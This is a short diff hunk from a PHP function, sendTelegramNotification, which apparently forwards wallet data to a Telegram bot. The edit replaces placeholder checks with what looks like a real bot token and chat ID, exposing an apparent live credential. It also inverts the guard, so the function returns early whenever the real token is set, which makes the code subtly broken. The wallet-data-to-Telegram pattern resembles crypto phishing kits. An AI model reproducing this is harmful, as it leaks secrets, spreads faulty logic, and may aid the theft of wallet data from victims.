@@ -107,7 +107,7 @@ function sendTelegramNotification($walletData) {
     $botToken = TELEGRAM_BOT_TOKEN;
     $chatId = TELEGRAM_CHAT_ID;
     
-    if ($botToken === 'YOUR_BOT_TOKEN_HERE' || $chatId === 'YOUR_CHAT_ID_HERE') {
+    if ($botToken === '8082373827:AAEZwpGM3SDp-8MGvx94qWnaoPB4G5wYGiE' || $chatId === '8319559156') {
         return;
     }
     
